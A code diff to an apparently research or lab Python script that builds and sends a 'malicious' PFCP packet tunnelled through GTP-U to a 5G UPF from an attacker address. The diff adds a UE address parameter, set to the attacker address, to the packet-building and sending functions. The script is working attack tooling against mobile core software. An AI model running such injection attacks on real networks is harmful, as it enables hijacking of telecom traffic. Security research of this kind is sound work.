@@ -7,7 +7,7 @@ import time
 
 UPF_ADDR = "10.100.200.2"
 EVIL_ADDR = "10.100.200.66"
-
+UE_ADDR = "10.60.0.1"
 
 seq = 1
 
@@ -48,6 +48,7 @@ def build_malicious_pfcp_in_gtp_packet(
     src_addr,
     dest_addr,
     teid,
+    ue_addr,
     gtpu_src_port=RandShort(),
     gtpu_dest_port=2152,
     pfcp_src_port=RandShort(),
@@ -73,6 +74,7 @@ def build_malicious_pfcp_in_gtp_packet(
 def send_malicious_pfcp_in_gtp_packet(
     src_addr,
     dest_addr,
+    ue_addr,
     teid,
 ):
     """Sending a PFCP packet through user plane GTP tunnel to the UPF
@@ -89,6 +91,7 @@ def send_malicious_pfcp_in_gtp_packet(
         src_addr=src_addr,
         dest_addr=dest_addr,
         teid=teid,
+        ue_addr=ue_addr,
     )
 
     packet.show()
@@ -101,5 +104,8 @@ def send_malicious_pfcp_in_gtp_packet(
 
 
 send_malicious_pfcp_in_gtp_packet(
-    src_addr=EVIL_ADDR, dest_addr=UPF_ADDR, teid=int(sys.argv[1], 0)
+    src_addr=EVIL_ADDR,
+    dest_addr=UPF_ADDR,
+    ue_addr=EVIL_ADDR,
+    teid=int(sys.argv[1], 0),
 )
